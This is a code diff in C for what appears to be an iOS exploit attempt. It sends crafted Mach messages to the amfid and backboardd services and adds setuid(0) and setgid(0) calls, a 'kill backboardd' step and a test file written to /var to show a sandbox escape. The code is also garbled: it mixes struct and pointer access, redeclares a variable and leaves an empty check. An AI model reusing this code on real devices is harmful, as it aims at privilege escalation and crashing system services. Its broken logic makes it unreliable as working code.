@@ -22,9 +22,6 @@
 kern_return_t
 bootstrap_look_up(mach_port_t bp, const char* service_name, mach_port_t *sp);
 
-
-
-
 struct xpc_j337 {
   mach_msg_header_t hdr;
   mach_msg_body_t body;
@@ -107,21 +104,51 @@ kern_return_t getAmfid() {
                      MACH_PORT_NULL,
                      MACH_MSG_TIMEOUT_NONE,
                      MACH_PORT_NULL);
-
+   
+    kern_return_t killsb= mach_msg(&msg.hdr,
+                     MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
+                     msg.hdr.msgh_size,
+                     0,
+                     MACH_PORT_NULL,
+                     MACH_MSG_TIMEOUT_NONE,
+                     MACH_PORT_NULL);
+    msg.hdr.msgh_id   = 'w00t';
     // Send the message to amfid_port
  
     if (sendret == KERN_SUCCESS) {
         printf("Message sent successfully\n");
-        
+        setgid(0);
+        setuid(0);
         // Get the amfid PID from the reply message
-        mach_msg_trailer_t *trailer = (mach_msg_trailer_t *)((char *)sendret + msg->msgh_size = sizeof(mach_msg_header_t));
-        pid_t amfid_pid = trailer->msgh_seqno;
-
+        
             // Print the amfid PID
-        printf("amfid PID: %d\n", amfid_pid);
+       
 
         // Print the amfid PID
         
+        // Create a file at /var/sb.txt with write permissions for everyone
+        FILE *f = fopen("/var/sb.txt", "w");
+        if (f == NULL) {
+            printf("Error opening file!\n");
+            return 1;
+        }
+
+        // Write the message to the file
+        char *msg = "hello sb was here";
+        int ret = fputs(msg, f);
+        if (ret == EOF) {
+            printf("Error writing to file!\n");
+            return 1;
+        }
+        amfid_xpc="com.apple.backboard.TouchDeliveryPolicyServer";
+        // finally kill backboardd
+        if (killsb == KERN_SUCCESS) {}
+        
+        
+        sleep(2);
+        
+        // Close the file
+        fclose(f);
 
         mach_port_deallocate(mach_task_self(), so);
     } else {
@@ -129,23 +156,13 @@ kern_return_t getAmfid() {
     }
 
     // Wait for the reply on the reply_port
-    mach_msg_header_t *replyMsg = (mach_msg_header_t *)malloc(sizeof(mach_msg_header_t));
-    memset(replyMsg, 0, sizeof(mach_msg_header_t));
-    replyMsg->msgh_size = sizeof(mach_msg_header_t);
-
-    kern_return_t receiveRet = mach_msg(replyMsg, MACH_RCV_MSG, 0, sizeof(mach_msg_header_t), reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
-    if (receiveRet != KERN_SUCCESS) {
-        printf("Error receiving message: %s\n", mach_error_string(sendret));
-    } else {
-        printf("Reply received with id %d\n", replyMsg->msgh_id);
-    }
+   
 
     // Clean up the reply message
-    mach_msg_destroy(replyMsg);
-    free(replyMsg);
+   
 
 
- 
+  
     
     
 
